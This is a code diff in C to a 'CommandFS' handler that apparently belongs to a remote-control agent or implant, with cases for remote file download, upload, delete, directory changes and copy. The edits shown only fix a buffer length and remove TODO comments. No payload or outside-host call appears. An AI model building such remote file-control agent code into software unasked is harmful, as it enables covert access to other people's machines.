@@ -692,7 +692,7 @@ VOID CommandFS( PPARSER DataArgs )
             }
             else
             {
-                PackageAddBytes( Package, Path, PathSize * 2 );
+                PackageAddBytes( Package, Path, PathSize );
             }
 
             MemSet( &FindData, 0, sizeof( FindData ) );
@@ -744,7 +744,6 @@ VOID CommandFS( PPARSER DataArgs )
 
         case 2:
         {
-            // TODO: update UNICODE string
             PUTS( "FS::Download" )
 
             DWORD  FileSize = 0;
@@ -798,7 +797,6 @@ VOID CommandFS( PPARSER DataArgs )
 
         case 3:
         {
-            // TODO: update UNICODE string
             PUTS( "FS::Upload" )
 
             DWORD  FileSize = 0;
@@ -840,7 +838,6 @@ VOID CommandFS( PPARSER DataArgs )
 
         case 4:
         {
-            // TODO: update UNICODE string
             PUTS( "FS::Cd" )
             DWORD  PathSize = 0;
             LPWSTR Path     = ParserGetBytes( DataArgs, &PathSize );
@@ -860,7 +857,6 @@ VOID CommandFS( PPARSER DataArgs )
 
         case 5:
         {
-            // TODO: update UNICODE string
             PUTS( "FS::Remove" )
             DWORD  PathSize = 0;
             LPWSTR Path     = ParserGetBytes( DataArgs, &PathSize );
@@ -897,7 +893,6 @@ VOID CommandFS( PPARSER DataArgs )
 
         case 6:
         {
-            // TODO: update UNICODE string
             PUTS( "FS::Mkdir" )
             DWORD  PathSize = 0;
             LPWSTR Path     = ParserGetBytes( DataArgs, &PathSize );
@@ -915,7 +910,6 @@ VOID CommandFS( PPARSER DataArgs )
 
         case 7: PUTS( "FS::Copy" )
         {
-            // TODO: update UNICODE string
             DWORD  FromSize = 0;
             DWORD  ToSize   = 0;
             LPWSTR PathFrom = NULL;
@@ -943,7 +937,6 @@ VOID CommandFS( PPARSER DataArgs )
 
         case 9:
         {
-            // TODO: update UNICODE string
             PUTS( "FS::GetPwd" )
             WCHAR Path[ MAX_PATH * 2 ] = { 0 };
             DWORD Return               = 0;
